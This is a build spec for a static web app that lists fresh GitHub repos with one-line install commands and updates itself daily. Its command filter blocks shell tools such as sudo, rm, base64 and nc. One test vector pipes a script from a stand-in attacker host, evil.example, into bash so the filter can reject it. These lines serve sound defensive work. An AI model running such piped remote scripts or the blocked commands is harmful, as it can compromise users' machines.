# github.fetch — Build Spec (Day 5)

> Spec author: Bot 1. Implementer: Bot 2 builds exactly this. Auditor: Bot 3 checks the result against this spec and the user's request.
> Repo: `rawmware/github.fetch`, working branch `claude/github-repo-funnel-app-9wmfzv` (default branch `main`).

## 0. The request, restated

> "what if day 5 was an application that funnels all the most recent github repositories, and the simplest form to install them, and what if it updated itself every day? ... build it in https://github.com/rawmware/github.fetch/ and then ill give it to another bot to deploy to vercel / my site"

Deliverable: a **static web app** listing the newest popular GitHub repos. Each card shows the **simplest one-line install command** with a Copy button. A **GitHub Actions cron job** refreshes the data **every day** and commits it, and Vercel redeploys on push. The app ships with zero dependencies and no build step. It deploys to Vercel as-is and can be copied under `rawmware.com/365-days/projects/day-005`.

Challenge facts: Day 5 of "365 Days of Showing Up" (Day 1 = 2026-09-28, so **Day 5 = 2026-10-02**). Eyebrow: `Day 5 · 365 Days of Showing Up`. Brand line: `RAWMWARE · DAY 005 / 365`.

### Side note: the most popular GitHub repositories (context only, not built)

The "recent" funnel answers a different question from "most starred of all time". For reference, these were the top repos by stars at spec time (approximate):

| # | Repo | Stars |
|---|------|------:|
| 1 | codecrafters-io/build-your-own-x | ~551k |
| 2 | sindresorhus/awesome | ~514k |
| 3 | public-apis/public-apis | ~486k |
| 4 | freeCodeCamp/freeCodeCamp | ~457k |
| 5 | EbookFoundation/free-programming-books | ~398k |
| 6 | openclaw/openclaw | ~391k |
| 7 | donnemartin/system-design-primer | ~373k |
| 8 | kamranahmedse/developer-roadmap | ~369k |
| 9 | jwasham/coding-interview-university | ~362k |
| 10 | vinta/awesome-python | ~325k |

Most of these are lists or curricula, so they have no install step. This is why the app works with *recent* repos and falls back to `git clone`.

## 1. Non-goals

- No framework, bundler, transpiler, npm dependency, or server runtime. There are no Vercel functions.
- No "Refresh live" button that calls the GitHub API from the browser. Unauthenticated search allows 10 req/min and would return repos without install detection. Freshness comes from the remote-mirror fetch in §5.2 instead.
- Commands are **never executed**, only displayed and copied. No "run" buttons and no `x-` protocol links.
- No README parsing for `.rst` or other non-Markdown formats beyond finding the file. No language-specific installers beyond the table in §4.3 (no gem, composer, nix, apt, winget, or scoop).
- No user accounts, analytics, cookies, or service worker.
- Do not modify `/home/user/rawmware.01`. Do not deploy. Do not push to `main`.

## 2. File tree (exact)

```
github.fetch/
├── BUILD.md                      # this spec (keep)
├── README.md                     # rewritten (§8.1)
├── HANDOFF.md                    # deploy-bot instructions (§8.2)
├── package.json                  # scripts only, NO dependencies (§2.1)
├── vercel.json                   # §7.2
├── .gitignore                    # node_modules/, .DS_Store, *.tmp, .vercel
├── .github/workflows/daily-update.yml   # §6
├── dist/                         # the deployable site (Vercel outputDirectory)
│   ├── index.html
│   ├── styles.css
│   ├── app.js                    # ES module entry
│   ├── lib/
│   │   ├── format.js             # pure: compact numbers, relative time, lang colour
│   │   ├── filter.js             # pure: filter/sort/URL-state functions
│   │   └── render.js             # DOM builders (textContent only)
│   ├── icon.svg                  # 64x64 favicon (funnel glyph, monochrome)
│   └── data/
│       ├── repos.json            # current snapshot (§3)
│       └── history/YYYY-MM-DD.json   # compact daily snapshots, keep newest 30
└── scripts/
    ├── fetch-repos.mjs           # updater CLI (§4)
    ├── validate-data.mjs         # schema + sanity check CLI (§3.4)
    ├── serve.mjs                 # local static server (§7.3)
    ├── export-rawmware.mjs       # copy build into a rawmware checkout (§8.2)
    ├── test.mjs                  # node:test suite (§9)
    ├── fixtures/seed-search.json # copy of the provided seed file
    └── lib/
        ├── http.mjs              # fetchWithRetry, pool
        ├── normalize.mjs         # API item → Repo, filters, spam rules
        ├── install-detect.mjs    # pure install detection + isSafeCommand
        └── schema.mjs            # validateSnapshot (pure, no I/O)
```

`dist/lib/filter.js` and `dist/lib/format.js` must be pure ES modules with no DOM access, so `scripts/test.mjs` can import them.

### 2.1 package.json

```json
{
  "name": "github-fetch",
  "private": true,
  "type": "module",
  "engines": { "node": ">=20" },
  "scripts": {
    "update": "node scripts/fetch-repos.mjs",
    "seed": "node scripts/fetch-repos.mjs --seed scripts/fixtures/seed-search.json",
    "validate": "node scripts/validate-data.mjs",
    "test": "node --test scripts/test.mjs",
    "serve": "node scripts/serve.mjs"
  }
}
```

## 3. Data: `dist/data/repos.json`

### 3.1 Top-level schema (schemaVersion 1)

```jsonc
{
  "schemaVersion": 1,
  "generatedAt": "2026-10-03T06:17:42.000Z",  // when this file was written (ISO, UTC)
  "snapshotAt":  "2026-10-03T06:17:10.000Z",  // when star counts were observed (= generatedAt-ish live; seed.fetched_at in seed mode)
  "source": {
    "mode": "live",                            // "live" | "seed"
    "api": "https://api.github.com/search/repositories",
    "queries": [                               // one per window, in order 24h, 7d, 30d
      { "window": "24h", "q": "created:>=2026-10-02T06:17:10Z stars:>=5 fork:false archived:false mirror:false is:public",
        "sort": "stars", "order": "desc", "perPage": 50, "returned": 50, "ok": true }
    ],
    "warnings": []                             // strings, e.g. "window 24h failed: HTTP 503"
  },
  "windows": [
    { "id": "24h", "label": "Last 24 hours", "hours": 24 },
    { "id": "7d",  "label": "Last 7 days",   "hours": 168 },
    { "id": "30d", "label": "Last 30 days",  "hours": 720 }
  ],
  "stats": {
    "total": 163,
    "withOneLiner": 97,                        // primary.confidence !== "fallback"
    "languages": 24,                           // distinct non-null languages
    "byMethod": { "npm-global": 14, "clone": 66 }   // count of primary.method
  },
  "repos": [ /* Repo[], sorted by stars desc, then fullName asc */ ]
}
```

In seed mode, `source.queries` is `[{ "window": "seed", "q": <seed.query>, "returned": <items.length>, "ok": true }]`.

### 3.2 Repo

```jsonc
{
  "fullName": "zai-org/ZCode",
  "owner": "zai-org",
  "name": "ZCode",
  "url": "https://github.com/zai-org/ZCode",
  "avatarUrl": "https://avatars.githubusercontent.com/u/223098841?v=4",
  "homepage": "https://zcode.z.ai/",          // null if empty or not http(s)
  "description": "Z.ai's coding agent harness. Powerful, intelligent, extensible.",
  "language": "TypeScript",                    // or null
  "topics": [],                                // always an array (API null → []), max 10
  "license": "Apache-2.0",                     // SPDX id string; null if absent or "NOASSERTION". API object {spdx_id} → string
  "stars": 7341, "forks": 2237, "openIssues": 11,
  "createdAt": "2026-09-20T12:01:16Z",
  "pushedAt":  "2026-09-29T10:06:54Z",
  "defaultBranch": "main",
  "ageDays": 12.71,                            // (snapshotAt - createdAt)/86400000, 2 decimals
  "starsPerDay": 577.6,                        // stars / max(ageDays, 1), 1 decimal
  "starsDelta1d": null,                        // stars - stars in the newest history file 18–30h older than snapshotAt; else null
  "windows": ["30d"],                          // window ids where createdAt >= snapshotAt - hours
  "install": {
    "primary":    { /* InstallOption */ },
    "alternates": [ /* 0..3 InstallOption, distinct commands, none equal to primary */ ],
    "clone": "git clone --depth 1 https://github.com/zai-org/ZCode.git"
  }
}
```

### 3.3 InstallOption

```jsonc
{
  "method": "npm-global",          // id from §4.3 table, or "clone"
  "family": "node",                // node | python | rust | go | brew | shell | docker | git
  "label": "npm (global)",         // human label from §4.3
  "command": "npm install -g zcode",
  "confidence": "readme",          // "readme" | "manifest" | "fallback"
  "source": "README.md · Installation",  // "<file> · <nearest heading>" | "<manifest file>" | null
  "platform": "any",               // "any" | "macos-linux" | "windows"
  "note": null                     // short string ≤ 140 chars, or null
}
```

The fallback primary is `{ method: "clone", family: "git", label: "git clone", command: <clone>, confidence: "fallback", source: null, platform: "any", note: "No one-line installer found — follow the README." }`.

### 3.4 History + validation

- `dist/data/history/YYYY-MM-DD.json` (UTC date of `snapshotAt`) has the shape `{ "snapshotAt": ISO, "repos": [{ "fullName", "stars", "forks" }] }`. The updater overwrites the file for the same date, then deletes all but the newest **30** files.
- `scripts/lib/schema.mjs` exports `validateSnapshot(obj) → { ok: boolean, errors: string[] }`. It checks:
  - `schemaVersion === 1`. `generatedAt` and `snapshotAt` parse as dates.
  - `repos` has 1–300 entries and `fullName` values are unique.
  - `fullName` matches `^[A-Za-z0-9-]+/[A-Za-z0-9._-]+$`, `url === "https://github.com/" + fullName`, and `owner/name` match `fullName`.
  - `avatarUrl` starts with `https://avatars.githubusercontent.com/`. `homepage` is null or `^https?://`.
  - `stars`, `forks`, and `openIssues` are integers ≥ 0. `topics` is an array of strings. `windows` ⊆ declared window ids.
  - `install.clone === "git clone --depth 1 " + url + ".git"`.
  - Every install command passes `isSafeCommand` (§4.5) or equals the clone command.
  - `confidence` is in the enum. Alternates number 3 or fewer, with no duplicate commands.
  - `stats` agree with `repos`.
- `scripts/validate-data.mjs [path=dist/data/repos.json]` runs `validateSnapshot`, then checks that the file is under 1.5 MB and `repos.length >= 20`. It prints a summary and exits with code 0 or 1.

## 4. Updater: `scripts/fetch-repos.mjs`

Node ≥ 20, built-ins only (global `fetch`, `AbortSignal.timeout`, `node:fs/promises`, `node:path`, `node:util` parseArgs).

### 4.1 CLI

| Flag | Default | Meaning |
|------|---------|---------|
| `--seed <file>` | — | Offline mode. Read a GitHub-search-shaped JSON (`{query, fetched_at, items[]}` or a bare array) instead of calling the API. `snapshotAt = fetched_at` (else the file's mtime). Install probing still runs via raw.githubusercontent.com. |
| `--out <path>` | `dist/data/repos.json` | Output file. History goes to `<dirname(out)>/history/`. |
| `--no-probe` | off | Skip all raw/registry fetches. Every repo gets the fallback clone install (used by tests). |
| `--limit <n>` | `200` | Max repos after dedupe and filters. |
| `--concurrency <n>` | `6` | Repos probed in parallel. |
| `--now <iso>` | real now | Override "now" (for deterministic tests). Live `snapshotAt = now`. |
| `--dry-run` | off | Do everything except write files. Print the summary. |

Env: `GITHUB_TOKEN` (optional; sent as `Authorization: Bearer`. Live mode logs a warning if missing). Exit codes: `0` success (written), `1` failure (**nothing written**), `2` bad arguments.

### 4.2 Live queries (exact)

`GET https://api.github.com/search/repositories?q=<q>&sort=stars&order=desc&per_page=<n>&page=1`, with headers `Accept: application/vnd.github+json`, `X-GitHub-Api-Version: 2022-11-28`, and `User-Agent: github.fetch-updater`.

| window | `q` (T = snapshotAt) | per_page |
|--------|---------------------|---------:|
| `24h` | `created:>=<T−24h as YYYY-MM-DDTHH:MM:SSZ> stars:>=5 fork:false archived:false mirror:false is:public` | 50 |
| `7d`  | `created:>=<T−7d as YYYY-MM-DD> stars:>=25 fork:false archived:false mirror:false is:public` | 100 |
| `30d` | `created:>=<T−30d as YYYY-MM-DD> stars:>=100 fork:false archived:false mirror:false is:public` | 100 |

Queries run sequentially, with up to 3 attempts each. Attempts retry on network error, 5xx, 429, or 403 with `x-ratelimit-remaining: 0`. The wait between attempts is `retry-after` seconds, else `x-ratelimit-reset − now`, else 2 s, then 8 s. The wait is capped at 60 s. Each request has a 20 s timeout. A window that still fails after 3 attempts gets `ok:false` and adds a warning. Other windows continue.

### 4.3 Normalise, filter, dedupe

1. Merge all items, dedupe by `full_name` case-insensitively, keep the first, and sort by stars desc.
2. Drop items where any of these hold:
   - `fork`, `archived`, or `disabled` is true.
   - `description` is missing or shorter than 10 chars after trim.
   - The description matches the spam regex `/\b(cheats?|hack(s|ed)?|crack(ed)?|keygen|aimbot|wallhack|mod ?menu|robux|v-?bucks|free (download|premium)|generator 202\d|unlock(er)?|spoofer|injector)\b/i`.
   - Any topic is in `["cheat","hack","crack","keygen","aimbot","spoofer"]`.
3. Normalise to Repo (§3.2): trim the description to 300 chars and collapse whitespace. Seed `topics: null` becomes `[]`. Seed `license` is already a string.
4. Truncate to `--limit` and compute `ageDays`, `starsPerDay`, `windows`, and `starsDelta1d`.
5. **If fewer than 20 repos remain, exit 1 without writing** (MIN_REPOS = 20).

### 4.4 Install detection

**Probing.** All file reads use `https://raw.githubusercontent.com/{owner}/{repo}/{defaultBranch}/{path}`, with each path segment URL-encoded. Each request has a 10 s timeout and 1 retry on network error, 5xx, or 429 after 1.5 s. A 404 means the file is absent. Bodies are truncated to 256 KB for READMEs and 64 KB otherwise. Per repo:

1. README: try `README.md`, `readme.md`, `Readme.md`, `README.MD`, `README.markdown`, `README.rst`, `README` in order and stop at the first 200.
2. In parallel: `package.json`, `pyproject.toml`, `setup.py`, `Cargo.toml`, `go.mod`, `Dockerfile`, `install.sh`.
3. Conditional probes: `src/main.rs` (only if Cargo.toml exists with no `[[bin]]` and no `[workspace]`) and `main.go` (only if go.mod exists).
4. Registry checks (10 s timeout, network failure means "not verified"):
   - npm: `https://registry.npmjs.org/<name>` (scoped names encode `/` as `%2f`). Verified if 200 and `repository.url` (string or `.url`) contains `github.com/{owner}/{repo}` case-insensitively.
   - PyPI: `https://pypi.org/pypi/<name>/json`. Verified if 200 and any value in `info.project_urls` or `info.home_page` contains `github.com/{owner}/{repo}` case-insensitively.

Any exception inside one repo's detection is logged and that repo gets the fallback. **The run never fails because of one repo.**

**Method table.** Rank 1 is the simplest. Each regex is applied to one trimmed line after prompt-stripping. `NAME` means `@?[A-Za-z0-9][A-Za-z0-9._/-]*`. `GITURL` means `git\+https://github\.com/[A-Za-z0-9._-]+/[A-Za-z0-9._-]+(\.git)?`.

| rank | method | family | label | platform | accepted shape (regex, anchored `^…$`) |
|-----:|--------|--------|-------|----------|----------------------------------------|
| 1 | `brew` | brew | Homebrew | macos-linux | `brew install (--cask )?NAME` |
| 2 | `npm-global` | node | npm (global) | any | `(npm (i\|install) (-g\|--global)\|pnpm (add\|i\|install) -g\|yarn global add\|bun (add\|i\|install) -g) NAME(@[A-Za-z0-9._^~-]+)?` |
| 3 | `npx` | node | npx (no install) | any | `(npx( -y\| --yes)?\|pnpm dlx\|bunx) NAME(@[A-Za-z0-9._-]+)?( [A-Za-z0-9._/=:@-]+){0,4}` |
| 4 | `uv-tool` | python | uv tool | any | `uv tool install (NAME\|GITURL)` |
| 5 | `uvx` | python | uvx (no install) | any | `uvx NAME( [A-Za-z0-9._/=:@-]+){0,4}` |
| 6 | `pipx` | python | pipx | any | `pipx install (NAME\|GITURL)` |
| 7 | `pip` | python | pip | any | `(pip3?\|python3? -m pip\|uv pip) install (-U \|--upgrade )?(NAME(\[[a-z0-9,_-]+\])?\|GITURL)` |
| 8 | `cargo` | rust | cargo | any | `cargo install (--locked )?(NAME\|--git https://github\.com/[A-Za-z0-9._-]+/[A-Za-z0-9._-]+(\.git)?)( --locked)?` |
| 9 | `go` | go | go install | any | `go install [A-Za-z0-9._~/-]+@[A-Za-z0-9._-]+` |
| 10 | `curl-sh` | shell | install script | macos-linux | `(curl( -[A-Za-z]+)+\|wget -qO-) ['"]?https://[^\s'"\|]+['"]? \| (sh\|bash\|zsh)( -s( -- [A-Za-z0-9 ._=-]+)?)?` |
| 11 | `powershell` | shell | PowerShell | windows | `(irm\|iwr\|Invoke-RestMethod\|Invoke-WebRequest)( -useb)? https://\S+ \| iex` (case-insensitive) |
| 12 | `docker` | docker | Docker | any | starts with `docker run ` or `docker pull `. Tokenise on spaces. Skip flags (`-x`/`--xx`, `--xx=v`; value-taking flags `-p -v -e -w --name --env --publish --volume --network --platform` consume the next token). The first non-flag token is the image and must match `[a-z0-9._/-]+(:[A-Za-z0-9._-]+)?`. At most 3 trailing args. |
| 13 | `docker-build` | docker | Docker build | any | manifest only (see below) |
| — | `clone` | git | git clone | any | fallback only |

**A. README candidates (confidence `readme`).** This step runs only for Markdown READMEs, scanning the first 64 KB.

- Track the nearest preceding ATX heading (`#`–`######`) or setext heading.
- Candidate lines come from:
  - fenced code blocks (```` ``` ```` or `~~~`) whose info string is empty or one of `sh bash shell console zsh fish powershell pwsh ps1 ps text terminal cmd`
  - inline code spans that are the whole command
- Prompt-strip each line by removing a leading `$ `, `% `, `> `, `# ` (only inside console blocks), or `PS> `. Skip blank and comment lines.
- Section score from the heading:
  - `/install/i` scores 3
  - `/quick ?start|getting started|setup|get started/i` scores 2
  - `/usage|run|try/i` scores 1
  - otherwise 0
  - `/contribut|develop|from source|build|test|uninstall/i` scores −1 and the line is **excluded**. This check overrides the others; "Build from source" is excluded even though it contains no "install".
- Keep a line only if it passes `isSafeCommand` (§4.5), matches exactly one table regex, and passes the **relation check** below.
- Rank candidates by section score desc, then method rank asc, then document order. Dedupe by exact command.

**Relation check.** This applies to README candidates only and stops prerequisite lines like `npm i -g pnpm` or `pip install torch` from being picked.

- Let `norm(s) = s.toLowerCase().replace(/[^a-z0-9]/g, "")`.
- The subject token `T` depends on the method:
  - package methods: the package name without scope, version, and extras
  - brew: the last `/` segment
  - go: the module path
  - docker: the image without its tag
  - URL methods: the URL
- The candidate is related if **any** of these hold:
  - (a) the command contains `github.com/{owner}/{repo}` or `{owner}/{repo}`, case-insensitively
  - (b) `norm(T) === norm(repo)`, or `norm(T)` equals `norm` of the package.json, pyproject, or Cargo name
  - (c) the shorter of `norm(T)` and `norm(repo)` is ≥ 4 chars and is contained in the other
  - (d) for `curl-sh` or `powershell`: the URL host is `github.com`, `raw.githubusercontent.com`, or `objects.githubusercontent.com` and the path contains `/{owner}/{repo}/` case-insensitively; **or** the host equals the repo homepage host, or one of the two is a subdomain of the other; **or** `norm(host)` contains `norm(repo)` or `norm(owner)` and that string is ≥ 4 chars
  - (e) for `docker`: the image contains `norm(owner)` or `norm(repo)` (≥ 4 chars), or starts with `ghcr.io/{owner}/` case-insensitively

**B. Manifest candidates (confidence `manifest`).** Generated in this priority order:

1. **package.json**: parse the JSON and skip if `private === true` or parsing fails.
   - If it has `bin` (string or object) and a `name`: use `npm install -g <name>` if the npm registry verifies it. Otherwise use `npm install -g github:{owner}/{repo}` with note "Installs straight from GitHub (not published to npm)."
   - With no `bin` (a library, or a monorepo root with `workspaces`), emit nothing. Libraries fall through to later manifests or to the clone fallback.
2. **pyproject.toml**: read the `name` under `[project]` (or `[tool.poetry]`) with a regex. Check for a `[project.scripts]` or `[tool.poetry.scripts]` table.
   - Scripts present: use `pipx install <name>` if PyPI verifies it, else `pipx install git+https://github.com/{owner}/{repo}.git`. Also add the alternate `uv tool install …` with the same target.
   - No scripts: use `pip install <name>` if PyPI verifies it, else `pip install git+https://github.com/{owner}/{repo}.git`.
3. **setup.py** (without pyproject.toml): `pip install git+https://github.com/{owner}/{repo}.git`.
4. **Cargo.toml**: skip if it has `[workspace]` and no `[package]`. If it has `[[bin]]` or `src/main.rs` exists: `cargo install --git https://github.com/{owner}/{repo}`.
5. **go.mod**: read `module <path>`. If `main.go` exists: `go install <path>@latest`.
6. **install.sh**: `curl -fsSL https://raw.githubusercontent.com/{owner}/{repo}/{branch}/install.sh | sh`, with note "Pipes a repo script to your shell — read it first."
7. **Dockerfile**: `docker build -t <norm(repo)> https://github.com/{owner}/{repo}.git#{branch}` (method `docker-build`).

**C. Assemble.**
- `primary` is the first README candidate. If there are none, it is the first manifest candidate. If there are none of those either, it is the fallback (§3.3).
- `alternates` are the remaining README candidates followed by the manifest candidates, deduped by command, excluding the primary, and limited to the first 3.
- Every `curl-sh` or `powershell` option gets the note "Pipes a remote script to your shell — read it first." unless a note is already set.
- `clone` is always present.

### 4.5 `isSafeCommand(cmd) → boolean` (exported, pure)

`isSafeCommand` returns true only if **all** of these hold:

1. `typeof cmd === "string"` and 4 ≤ length ≤ 200.
2. The command is a single line containing only printable ASCII (`/^[\x20-\x7E]+$/`).
3. It contains none of these:
   - `` ` ``, `$(`, `${`, `;`, `&`, `>`, `<`, `\`, `{`, `}`
   - `sudo `, `eval `, ` rm `, `rm -`, `chmod`, `mkfifo`, `/dev/`, `base64`, `nc `
   - `...`, `YOUR_`, `your-`, `<version>`, `xxx`
4. It has at most one `|`, and a `|` is allowed only if the command matches the `curl-sh` or `powershell` regex.
5. Every `http(s)://` URL in it is `https://`.
6. It matches exactly one method regex from §4.3. `git clone --depth 1 https://github.com/<o>/<r>.git` is also allowed, for the clone check only.

All manifest-generated commands must also pass this check before being emitted. A command built from an odd package name that fails is dropped.

### 4.6 Test vectors (must be in `scripts/test.mjs`)

Context for all vectors: `owner=acme`, `repo=rocket-cli`, `homepage=https://rocket.dev`.

| # | Input (README section → line, or manifest) | Expected |
|---|--------------------------------------------|----------|
| 1 | `## Installation` → ```` ```sh\n$ brew install acme/tap/rocket-cli\n``` ```` | primary `brew`, `brew install acme/tap/rocket-cli`, readme, source `README.md · Installation` |
| 2 | `## Install` → `npm i -g pnpm` then `npm i -g rocket-cli` | primary `npm-global` `npm i -g rocket-cli`. pnpm rejected (relation) |
| 3 | `## Quick start` → `curl -fsSL https://rocket.dev/install.sh \| bash` | primary `curl-sh`, note mentions reading the script |
| 4 | `## Install` → `curl -fsSL https://evil.example/x.sh \| bash` | rejected (relation). Falls through |
| 5 | `## Install` → `curl https://rocket.dev/i.sh \| sudo bash` | rejected (`sudo`) |
| 6 | `## Install` → `npm i -g rocket-cli && rocket init` | rejected (`&`) |
| 7 | `## Building from source` → `cargo install --path .` | excluded (section −1) |
| 8 | package.json `{"name":"rocket-cli","bin":{"rocket":"x.js"}}`, npm not verified, no README hits | primary `npm install -g github:acme/rocket-cli`, manifest |
| 9 | pyproject with `[project] name="rocket-cli"` + `[project.scripts]`, PyPI not verified | primary `pipx install git+https://github.com/acme/rocket-cli.git`, alternate `uv tool install git+…` |
| 10 | go.mod `module github.com/acme/rocket-cli` + main.go | primary `go install github.com/acme/rocket-cli@latest` |
| 11 | No README hits, no manifests | primary `clone` fallback; `clone === "git clone --depth 1 https://github.com/acme/rocket-cli.git"` |
| 12 | `## Install` → `brew install rocket-cli` and `## Usage` → `npx rocket-cli init` | primary brew. Alternates include npx |
| 13 | `isSafeCommand` of a 201-char string, `"a\nb"`, `"pip install x>=1"`, and `` "echo `id`" `` | all false |

### 4.7 Writing (never publish a bad file)

1. Build the snapshot object and run `validateSnapshot`. If it is not ok, print the errors and **exit 1** without writing.
2. Write atomically: write `<out>.tmp`, then `rename`. Do the same for the history file, then prune history to 30 files.
3. Before overwriting, read the previous `repos.json` (if any) only to log the counts as "N new repos vs last run". `starsDelta1d` comes from history.
4. Print a summary: mode, repo count, `byMethod`, warnings, and elapsed seconds.

## 5. UI (`dist/index.html`, `styles.css`, `app.js`, `lib/*`)

### 5.1 Page structure (top to bottom)

1. `<head>`:
   - `<meta charset>` comes first, then viewport and `theme-color #0a0a0b`
   - description: "Day 5 of 365 Days of Showing Up: the newest GitHub repos people are starring, each with the simplest one-line install. Updated daily."
   - `<title>github.fetch — Fresh Repos, One-Line Installs</title>`
   - `<link rel="icon" href="icon.svg">`, `styles.css`, and `<script type="module" src="app.js">`
   - `<meta name="gf-remote-data" content="https://raw.githubusercontent.com/rawmware/github.fetch/main/dist/data/repos.json">`
   - no external fonts; system stacks only
2. Skip link `<a class="skip" href="#results" data-jump="results">Skip to repos</a>`. JS intercepts it to `focus()` the target, so it stays safe under a `<base>` tag. **No other fragment-only hrefs.**
3. Top bar: a brand button with the funnel icon, "github.fetch", and a small `RAWMWARE · DAY 005 / 365` line. A link to the source repo at `https://github.com/rawmware/github.fetch`.
4. Hero:
   - eyebrow `Day 5 · 365 Days of Showing Up`
   - h1 "The newest GitHub repos worth a star — and the one line to install each."
   - lede (one sentence): "Every morning a robot searches GitHub for fresh repositories people are starring, figures out the simplest way to install each one, and publishes the list here."
   - status line: `Updated daily · last run <relative> ` in a `<time datetime=generatedAt title=local absolute>`
   - if `generatedAt` is more than 36 h old, a "stale" badge: "Last update was N days ago — the daily job may be paused."
5. Stats row of 4 tiles: repos tracked, languages, % with a one-line install, and "fastest riser" (top `starsPerDay` repo name + value).
6. Controls (`<form role="search">`, no submit):
   - Window radio group `fieldset` (24h / 7 days / 30 days / All). The default is `7d`. If 7d is empty, it defaults to the first non-empty of 30d or All.
   - Language `<select>`: "All languages" plus the languages in the data, sorted by count desc, each with a count in its label.
   - Install `<select>`: All, "One-liners only" (confidence ≠ fallback), Homebrew, Node, Python, Rust, Go, Shell script, Docker, Clone only. The non-"All" options filter by `family` of the primary, except "One-liners only".
   - Search `<input type="search">`: case-insensitive over fullName, description, and topics, debounced 120 ms.
   - Sort `<select>`: Stars (default), Newest, Stars/day, Gained today (`starsDelta1d`, nulls last; hidden if every value is null).
   - Reset button.
   - Result count in `aria-live="polite"`: "Showing 30 of 87 repos".
   - All state syncs to the query string (`w`, `lang`, `m`, `q`, `sort`) via `history.replaceState(null, "", location.pathname + "?" + qs)`, and is read on load.
7. Results: `<section id="results" tabindex="-1">` containing an `<ol>` of cards in a CSS grid. The first render shows 30 cards. A "Show 30 more" button appends more and is hidden at the end.
8. Footer:
   - "Data: GitHub Search API · refreshed daily at 06:17 UTC by GitHub Actions"
   - "Commands are shown, never run — read before you paste."
   - links to `data/repos.json` and the source repo
   - "A Rawmware project · Day 5 of 365"
9. `<noscript>`: "github.fetch needs JavaScript to render the list. The raw data is at data/repos.json."

### 5.2 Data loading

- `const localUrl = new URL("data/repos.json", import.meta.url)`. This resolves correctly under any base path or `<base>` tag.
- `remoteUrl` comes from the `gf-remote-data` meta. An empty value disables it, and `?offline=1` also disables it.
- Fetch both in parallel (`cache: "no-cache"`). The remote fetch has a 6 s timeout via `AbortController`. Accept a response only if it is JSON with `schemaVersion === 1`, `Array.isArray(repos)`, and a parseable `generatedAt`.
- **Use whichever accepted snapshot has the later `generatedAt`.** This keeps the copy embedded on rawmware.com fresh every day even though that site's own copy of the file is static. raw.githubusercontent.com sends `Access-Control-Allow-Origin: *`.
- If both fail, show the error panel: "Couldn't load today's repos." with a Retry button that re-runs the load.
- While loading, show 3 skeleton cards with `aria-busy="true"` on results. Under `prefers-reduced-motion`, there is no shimmer.

### 5.3 Repo card (`<li><article>`)

- Header:
  - rank `#N`
  - avatar `<img>` with src `avatarUrl + "&s=64"` (or `?s=64` if there is no `?`), `width=32 height=32 loading=lazy alt="" referrerpolicy=no-referrer`, only if the host is `avatars.githubusercontent.com`
  - `<h3><a href=url target=_blank rel="noopener noreferrer">owner/<b>name</b></a></h3>`
- Description: 3-line clamp, with the full text in `title`.
- Meta row:
  - language dot + name (colour from a 20-language map in `format.js`, else `hsl(hash(lang)%360 45% 60%)`)
  - `★ 7.3k`, using `Intl.NumberFormat` compact notation
  - `+312 today` when `starsDelta1d > 0`
  - `12d old`, or `5h old` if younger than 1 day
  - `578★/day`
  - license
- Topics: up to 5 chips (text only, not links).
- **Install block** (the visual focus of the card):
  - method switcher: `role="group" aria-label="Install method for owner/name"` with one `<button aria-pressed>` per option, primary first, then alternates, then "clone"
  - `<pre><code>` holding the selected command; it scrolls horizontally inside the block, never the page
  - "Copy" button: `aria-label="Copy install command for owner/name"`
  - small badge for confidence: "from README" / "from package.json" (uses `source` for manifests) / "fallback"
  - platform tag if not `any` ("macOS/Linux", "Windows")
  - note (curl-sh warning shown in warning colour)
- Footer links: "Repo ↗" and "Homepage ↗" (homepage only if `https:`).

**Copy behaviour.** Use `navigator.clipboard.writeText(cmd)`. Fall back to a hidden `<textarea>` with `select()` and `document.execCommand("copy")`. On success the button shows "Copied ✓" for 1.5 s and a shared `aria-live` region announces "Copied: <cmd>". On failure, select the text in `<code>` and announce "Press Ctrl+C to copy".

### 5.4 Rendering & safety rules

- **All data enters the DOM via `textContent`, `setAttribute` on safe attributes, or `el.href` after URL validation.** No `innerHTML`, `insertAdjacentHTML`, or `outerHTML` anywhere with data. Static templates may use `innerHTML` only for constant strings with no interpolation. Better still, use none.
- `safeUrl(u, allowedHosts?)`: `new URL(u)`, accepted only if the protocol is `https:` (and the host is in the allowlist when one is given). Otherwise the link is not rendered.
- No inline `style=` attributes. Dynamic colours go through `el.style.setProperty("--lang", c)`, which is allowed under CSP.

### 5.5 Visual design

- Dark only. Monochrome "smoked glass", matching rawmware.
- Tokens on `:root`: `--bg #0a0a0b`, `--surface rgba(255,255,255,.04)`, `--surface-2 rgba(255,255,255,.07)`, `--border rgba(255,255,255,.10)`, `--text #ececee`, `--muted #a1a1aa`, `--accent #ffffff`, `--ok #4ade80`, `--warn #fbbf24`, `--radius 14px`.
- Cards use `backdrop-filter: blur(12px)` over a subtle radial-gradient background.
- The command block uses a mono stack (`ui-monospace, SFMono-Regular, Menlo, Consolas, monospace`) on `--surface-2`.
- Grid: `grid-template-columns: repeat(auto-fill, minmax(min(100%, 340px), 1fr))` with gap 16px. The page gutter is 16px under 600px and 24px above. Max width is 1200px.
- Overflow: `min-width:0` on grid children and `overflow-wrap:anywhere` on names, descriptions, and topics. **No horizontal page scroll at 360px.**
- Focus: a visible `:focus-visible` outline (2px `--accent`, offset 2px) on every interactive element. Tap targets ≥ 40px.
- Under `@media (prefers-reduced-motion: reduce)`, set all transitions and animations to `none`.
- Text contrast ≥ 4.5:1 against `--bg`.
- `icon.svg`: 64×64, rounded square `#0a0a0b` with a white funnel glyph and three small dots entering the top.

## 6. Self-update: `.github/workflows/daily-update.yml`

```yaml
name: daily-update
on:
  schedule:
    - cron: "17 6 * * *"        # 06:17 UTC daily
  workflow_dispatch: {}
permissions:
  contents: write
concurrency:
  group: daily-update
  cancel-in-progress: false
jobs:
  update:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v5
        with: { node-version: 22 }
      - name: Fetch repos
        env: { GITHUB_TOKEN: "${{ secrets.GITHUB_TOKEN }}" }
        run: node scripts/fetch-repos.mjs
      - name: Validate
        run: node scripts/validate-data.mjs
      - name: Test
        run: node --test scripts/test.mjs
      - name: Commit if changed
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add dist/data
          if git diff --cached --quiet; then echo "No changes"; exit 0; fi
          git commit -m "chore(data): daily snapshot $(date -u +%F)"
          git pull --rebase origin "${GITHUB_REF_NAME}"
          git push origin "HEAD:${GITHUB_REF_NAME}"
```

Notes for the README and HANDOFF:
- If any step fails, nothing is committed. The live site keeps yesterday's data, and GitHub emails the repo owner.
- Scheduled workflows run **only on the default branch (`main`)**, so the feature branch must be merged first.
- The commit message must **not** contain `[skip ci]`, because Vercel would then skip the deploy.
